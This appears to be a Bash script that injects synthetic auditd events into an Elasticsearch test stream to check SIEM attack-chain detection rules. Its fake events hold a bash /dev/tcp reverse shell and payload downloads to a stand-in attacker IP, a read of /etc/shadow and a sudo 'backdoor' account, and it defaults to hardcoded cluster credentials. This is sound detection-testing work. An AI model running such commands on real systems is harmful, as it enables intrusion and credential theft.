#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# simulate_chain.sh — Linux attack-chain simulator for the chain/ detection rules.
#
# Injects synthetic auditd events (matching the updive schema) for a chosen
# attack chain into an ISOLATED data stream (logs-updive.audit-simtest) with
# CURRENT timestamps, then runs that chain's real rule queries to show the
# detection fires. The data stream matches the rules' FROM logs-updive.audit-*
# so your SIEM correlation engine will also pick it up.
#
# Usage:
#   ./simulate_chain.sh [scenario]      # inject + detect
#   ./simulate_chain.sh cleanup         # delete the test data stream
#
#   scenarios: ssh-brute (default) | sudo-privesc | malware | reverse-shell | new-user | all
#
# Config (env): ES_URL, ES_AUTH
#   ES_URL=http://10.10.10.60:9200 ES_AUTH=elastic:elasticpassword ./simulate_chain.sh ssh-brute
# ---------------------------------------------------------------------------
set -euo pipefail

ES_URL="${ES_URL:-http://10.10.10.60:9200}"
ES_AUTH="${ES_AUTH:-elastic:elasticpassword}"
DS="logs-updive.audit-simtest"
RULES_DIR="$(cd "$(dirname "$0")/.." && pwd)/chain"
ATTACKER="203.0.113.66"; HOST="simhost-01"; AID=99001
NDJSON="$(mktemp)"; trap 'rm -f "$NDJSON"' EXIT

es(){ curl -s -u "$ES_AUTH" "$@"; }
ts(){ date -u -d "-${1} seconds" +"%Y-%m-%dT%H:%M:%S.000Z"; }   # GNU date
add(){ printf '{"create":{"_index":"%s"}}\n%s\n' "$DS" "$1" >> "$NDJSON"; }

cleanup(){ es -X DELETE "$ES_URL/_data_stream/$DS" >/dev/null 2>&1 || true; echo "🧹 deleted data stream $DS"; }

reset_ds(){
  es -X DELETE "$ES_URL/_data_stream/$DS" >/dev/null 2>&1 || true
  es -X PUT "$ES_URL/_data_stream/$DS" >/dev/null
}

# ---- scenario event generators (fields match the chain rule WHERE clauses) ----
gen_ssh_brute(){
  local i
  for i in 0 1 2 3 4 5 6 7; do
    add "{\"@timestamp\":\"$(ts $((80-i*6)))\",\"agent_id\":$AID,\"source\":{\"ip\":\"$ATTACKER\"},\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"message_type\":\"user_login\",\"result\":\"fail\",\"data\":{\"acct\":\"root\",\"op\":\"login\",\"terminal\":\"sshd\"}},\"event\":{\"category\":\"authentication\",\"action\":\"logged-in\"}}"
  done
  add "{\"@timestamp\":\"$(ts 18)\",\"agent_id\":$AID,\"source\":{\"ip\":\"$ATTACKER\"},\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"message_type\":\"user_start\",\"result\":\"success\",\"data\":{\"acct\":\"root\",\"op\":\"login\",\"terminal\":\"sshd\"}},\"process\":{\"executable\":\"/usr/sbin/sshd\"},\"event\":{\"category\":\"authentication\",\"action\":\"logged-in\"}}"
  add "{\"@timestamp\":\"$(ts 12)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"root\"},\"process\":{\"name\":\"whoami\",\"executable\":\"/usr/bin/whoami\",\"args\":[\"whoami\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  add "{\"@timestamp\":\"$(ts 10)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"root\"},\"process\":{\"name\":\"wget\",\"executable\":\"/usr/bin/wget\",\"args\":[\"wget\",\"http://$ATTACKER/x\",\"-O\",\"/tmp/x\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  MATCH="SSH Intrusion"
}
gen_sudo_privesc(){
  local i
  for i in 0 1 2 3; do
    add "{\"@timestamp\":\"$(ts $((70-i*8)))\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"message_type\":\"user_auth\",\"result\":\"fail\",\"data\":{\"acct\":\"appuser\"},\"summary\":{\"how\":\"/usr/bin/sudo\"}},\"event\":{\"category\":\"authentication\",\"action\":\"authenticated\"}}"
  done
  add "{\"@timestamp\":\"$(ts 20)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"message_type\":\"user_cmd\",\"result\":\"success\",\"data\":{\"acct\":\"appuser\"},\"summary\":{\"how\":\"/usr/bin/sudo\"}},\"event\":{\"category\":\"process\",\"action\":\"ran-command\"}}"
  add "{\"@timestamp\":\"$(ts 12)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"root\"},\"auditd\":{\"data\":{\"uid\":\"0\"}},\"process\":{\"name\":\"cat\",\"executable\":\"/usr/bin/cat\",\"args\":[\"cat\",\"/etc/shadow\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  MATCH="Sudo PrivEsc"
}
gen_malware(){
  add "{\"@timestamp\":\"$(ts 60)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"www-data\"},\"process\":{\"name\":\"wget\",\"executable\":\"/usr/bin/wget\",\"args\":[\"wget\",\"http://$ATTACKER/payload\",\"-O\",\"/tmp/payload\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  add "{\"@timestamp\":\"$(ts 40)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"www-data\"},\"process\":{\"name\":\"payload\",\"executable\":\"/tmp/payload\",\"args\":[\"/tmp/payload\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  add "{\"@timestamp\":\"$(ts 20)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"file\":{\"path\":\"/etc/cron.d/payload\"},\"event\":{\"module\":\"file_integrity\",\"type\":\"change\",\"category\":\"file\",\"action\":\"changed\"}}"
  MATCH="Malware Delivery"
}
gen_reverse_shell(){
  add "{\"@timestamp\":\"$(ts 30)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"www-data\"},\"process\":{\"name\":\"bash\",\"executable\":\"/usr/bin/bash\",\"args\":[\"bash\",\"-c\",\"bash -i >& /dev/tcp/$ATTACKER/4444 0>&1\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  add "{\"@timestamp\":\"$(ts 14)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"user\":{\"name\":\"www-data\"},\"process\":{\"name\":\"whoami\",\"executable\":\"/usr/bin/whoami\",\"args\":[\"whoami\"]},\"event\":{\"category\":\"process\",\"action\":\"executed\"}}"
  MATCH="Reverse Shell"
}
gen_new_user(){
  add "{\"@timestamp\":\"$(ts 60)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"data\":{\"acct\":\"backdoor\"}},\"process\":{\"name\":\"useradd\",\"executable\":\"/usr/sbin/useradd\",\"args\":[\"useradd\",\"-m\",\"backdoor\"]},\"event\":{\"category\":\"iam\",\"action\":\"added-user-account\"}}"
  add "{\"@timestamp\":\"$(ts 40)\",\"agent_id\":$AID,\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"data\":{\"acct\":\"backdoor\"}},\"process\":{\"name\":\"usermod\",\"executable\":\"/usr/sbin/usermod\",\"args\":[\"usermod\",\"-aG\",\"sudo\",\"backdoor\"]},\"event\":{\"category\":\"iam\",\"action\":\"added-group-account-to\"}}"
  add "{\"@timestamp\":\"$(ts 18)\",\"agent_id\":$AID,\"source\":{\"ip\":\"$ATTACKER\"},\"host\":{\"hostname\":\"$HOST\"},\"auditd\":{\"message_type\":\"user_start\",\"result\":\"success\",\"data\":{\"acct\":\"backdoor\",\"terminal\":\"sshd\"}},\"event\":{\"category\":\"authentication\",\"action\":\"logged-in\"}}"
  MATCH="New User Backdoor"
}

detect(){   # run the matching chain rules' real queries against the live cluster
  echo ""; echo "🔎 Running chain rule queries that match '$1':"
  ES_URL="$ES_URL" ES_AUTH="$ES_AUTH" python3 - "$RULES_DIR" "$1" <<'PYEOF'
import sys, glob, os, json, base64, urllib.request, urllib.error, yaml
rules_dir, match = sys.argv[1], sys.argv[2]
auth = base64.b64encode(os.environ["ES_AUTH"].encode()).decode()
url = os.environ["ES_URL"].rstrip("/") + "/_query"
files = sorted(f for f in glob.glob(os.path.join(rules_dir, "*.yml")) if match in os.path.basename(f))
for f in files:
    q = yaml.safe_load(open(f))["query"]            # production NOW() window, as-is
    req = urllib.request.Request(url, data=json.dumps({"query": q}).encode(), method="POST",
        headers={"Content-Type": "application/json", "Authorization": "Basic " + auth})
    try:
        n = len(json.load(urllib.request.urlopen(req, timeout=60)).get("values", []))
        flag = "✅ DETECTED" if n > 0 else "—  no match"
        print(f"   [{flag}] {n:>3} rows  {os.path.basename(f)}")
    except urllib.error.HTTPError as e:
        print(f"   [ERR] {os.path.basename(f)} -> {json.load(e).get('error',{}).get('reason','?')[:70]}")
PYEOF
}

run_one(){
  local scen="$1"
  NDJSON="$(mktemp)"
  case "$scen" in
    ssh-brute)     gen_ssh_brute ;;
    sudo-privesc)  gen_sudo_privesc ;;
    malware)       gen_malware ;;
    reverse-shell) gen_reverse_shell ;;
    new-user)      gen_new_user ;;
    *) echo "unknown scenario: $scen"; echo "use: ssh-brute|sudo-privesc|malware|reverse-shell|new-user|all"; exit 1 ;;
  esac
  local cnt; cnt=$(grep -c '"create"' "$NDJSON")
  es -X POST "$ES_URL/$DS/_bulk?refresh=wait_for" -H 'Content-Type: application/json' --data-binary "@$NDJSON" >/dev/null
  echo "💥 [$scen] injected $cnt events  (attacker $ATTACKER -> host $HOST)"
  detect "$MATCH"
  rm -f "$NDJSON"
}

# ---- main ----
case "${1:-ssh-brute}" in
  cleanup|--cleanup) cleanup; exit 0 ;;
esac
echo "ES: $ES_URL   data stream: $DS"
reset_ds
if [ "${1:-ssh-brute}" = "all" ]; then
  for s in ssh-brute sudo-privesc malware reverse-shell new-user; do run_one "$s"; done
else
  run_one "${1:-ssh-brute}"
fi
echo ""
echo "ℹ️  Synthetic events are in data stream '$DS' (matches rules' FROM logs-updive.audit-*)."
echo "   Your SIEM correlation engine will pick these up and build the chained alert."
echo "   Clean up when done:  $0 cleanup"
